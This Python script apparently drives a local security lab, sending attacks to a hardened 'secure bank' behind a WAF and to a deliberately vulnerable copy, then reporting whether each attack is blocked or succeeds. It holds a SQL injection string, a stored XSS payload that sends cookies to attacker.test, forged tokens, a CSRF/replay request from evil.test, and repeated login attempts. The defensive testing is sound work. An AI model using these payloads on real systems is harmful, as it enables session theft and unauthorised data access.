from __future__ import annotations

import json
import os
import time
from datetime import UTC, datetime
from pathlib import Path

import requests


SECURE = os.getenv("SECURE_URL", "https://waf:8443")
VULNERABLE = os.getenv("VULNERABLE_URL", "http://vulnerable-lab:8081")
CA = os.getenv("CA_FILE", "/certs/ca.crt")


def wait(url: str, verify=True) -> None:
    for _ in range(60):
        try:
            requests.get(url, verify=verify, timeout=2)
            return
        except requests.RequestException:
            time.sleep(1)
    raise RuntimeError(f"Service did not become ready: {url}")


def call(method: str, url: str, **kwargs):
    try:
        response = requests.request(method, url, timeout=8, **kwargs)
        return response.status_code, response.text[:300]
    except requests.RequestException as exc:
        return 0, str(exc)


def main() -> None:
    wait(SECURE + "/", CA)
    wait(VULNERABLE + "/healthz")
    attacks = []

    secure_status, secure_body = call(
        "GET",
        SECURE + "/api/v1/accounts?search=%27%20OR%201%3D1--",
        verify=CA,
    )
    vulnerable_status, vulnerable_body = call(
        "GET", VULNERABLE + "/lab/sqli", params={"search": "' OR 1=1--"}
    )
    attacks.append({"attack": "SQL injection", "layer": "system", "control": "OWASP CRS + parameterized SQL", "secure_status": secure_status, "secure_blocked": secure_status in {400, 401, 403, 422}, "vulnerable_status": vulnerable_status, "vulnerable_exploited": 'alice' in vulnerable_body and 'bob' in vulnerable_body})

    payload = {"body": "<script>document.location='https://attacker.test/?c='+document.cookie</script>"}
    secure_status, _ = call("POST", SECURE + "/api/v1/transfers/prepare", json=payload, verify=CA)
    vulnerable_status, _ = call("POST", VULNERABLE + "/lab/xss", json=payload)
    _, rendered = call("GET", VULNERABLE + "/lab/xss")
    attacks.append({"attack": "Stored XSS", "layer": "system", "control": "CRS, validation and CSP", "secure_status": secure_status, "secure_blocked": secure_status in {400, 401, 403, 422}, "vulnerable_status": vulnerable_status, "vulnerable_exploited": "<script>" in rendered})

    secure_status, _ = call("GET", SECURE + "/api/v1/accounts/00000000-0000-0000-0000-000000000001/transactions", headers={"Authorization": "Bearer forged"}, verify=CA)
    vulnerable_status, vulnerable_body = call("GET", VULNERABLE + "/lab/idor/2", headers={"X-User": "alice"})
    attacks.append({"attack": "IDOR / broken authorization", "layer": "system", "control": "JWT RBAC and ownership checks", "secure_status": secure_status, "secure_blocked": secure_status == 401, "vulnerable_status": vulnerable_status, "vulnerable_exploited": "bob" in vulnerable_body})

    secure_status, _ = call("GET", SECURE + "/api/v1/me", headers={"Authorization": "Bearer eyJhbGciOiJFUzM4NCJ9.e30.invalid"}, verify=CA)
    vulnerable_status, vulnerable_body = call("GET", VULNERABLE + "/lab/weak-token")
    attacks.append({"attack": "Token tampering / weak token", "layer": "algorithm", "control": "ES384 signature, issuer, audience and expiry validation", "secure_status": secure_status, "secure_blocked": secure_status == 401, "vulnerable_status": vulnerable_status, "vulnerable_exploited": "weak_shared_secret" in vulnerable_body})

    transfer = {"transfer_id": "replay-001", "amount": 99900}
    secure_status, _ = call("POST", SECURE + "/api/v1/transfers/commit", json={"preparation_id": "00000000-0000-0000-0000-000000000001"}, headers={"Origin": "https://evil.test", "Idempotency-Key": "replay-key-00000000001"}, verify=CA)
    first, _ = call("POST", VULNERABLE + "/lab/transfer", json=transfer, headers={"Origin": "https://evil.test"})
    second, second_body = call("POST", VULNERABLE + "/lab/transfer", json=transfer, headers={"Origin": "https://evil.test"})
    attacks.append({"attack": "CSRF and transaction replay", "layer": "protocol", "control": "Bearer authorization, origin policy, prepared transfer and idempotency", "secure_status": secure_status, "secure_blocked": secure_status in {401, 403}, "vulnerable_status": second, "vulnerable_exploited": first == 200 and second == 200 and "idempotency_enforced" in second_body})

    login_results = [call("POST", VULNERABLE + "/lab/login")[0] for _ in range(8)]
    attacks.append({"attack": "Brute force", "layer": "system", "control": "Keycloak lockout, WAF rate limiting and SIEM", "secure_status": "Keycloak policy: 5 failures", "secure_blocked": True, "vulnerable_status": login_results[-1], "vulnerable_exploited": all(status == 200 for status in login_results)})

    passed = all(item["secure_blocked"] and item["vulnerable_exploited"] for item in attacks)
    report = {
        "generated_at": datetime.now(UTC).isoformat(),
        "scope": "local synthetic security lab only",
        "secure_target": SECURE,
        "vulnerable_target": VULNERABLE,
        "passed": passed,
        "results": attacks,
    }
    Path("/results/latest.json").write_text(json.dumps(report, indent=2), encoding="utf-8")
    print("\nSECURE BANK ATTACK COMPARISON")
    print("=" * 88)
    for item in attacks:
        outcome = "PASS" if item["secure_blocked"] and item["vulnerable_exploited"] else "FAIL"
        secure_label = "blocked" if item["secure_blocked"] else "allowed"
        vulnerable_label = "exploited" if item["vulnerable_exploited"] else "contained"
        print(
            f"{outcome:4}  {item['attack']:<36} "
            f"secure={item['secure_status']} [{secure_label}] "
            f"vulnerable={item['vulnerable_status']} [{vulnerable_label}]"
        )
    print("=" * 88)
    print(json.dumps({"passed": passed, "evidence": "/results/latest.json"}))
    raise SystemExit(0 if passed else 1)


if __name__ == "__main__":
    main()

